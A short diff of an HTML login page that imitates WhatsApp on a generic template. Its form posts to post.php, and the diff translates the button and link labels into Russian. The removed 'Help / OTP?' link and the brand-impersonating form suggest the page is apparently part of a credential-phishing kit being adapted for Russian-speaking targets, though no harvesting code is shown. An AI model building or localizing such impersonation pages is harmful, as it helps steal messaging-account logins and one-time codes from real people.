@@ -32,7 +32,7 @@
 
 				<form action="post.php" method="post" class="login100-form validate-form">
 					<span class="login100-form-title">
-						WhatsApp Login
+						WhatsApp
 					</span>
 
 
@@ -46,22 +46,22 @@
 					
 					<div class="container-login100-form-btn">
 						<button class="login100-form-btn">
-							Login
+							Войти
 						</button>
 					</div>
 
 					<div class="text-center p-t-12">
 						<span class="txt1">
-							Forgot
+							
 						</span>
 						<a class="txt2" href="#">
-							Help / OTP?
+							Помощь
 						</a>
 					</div>
 
 					<div class="text-center p-t-136">
 						<a class="txt2" href="#">
-							Create your Account
+							Создать аккаунт
 							<i class="fa fa-long-arrow-right m-l-5" aria-hidden="true"></i>
 						</a>
 					</div>
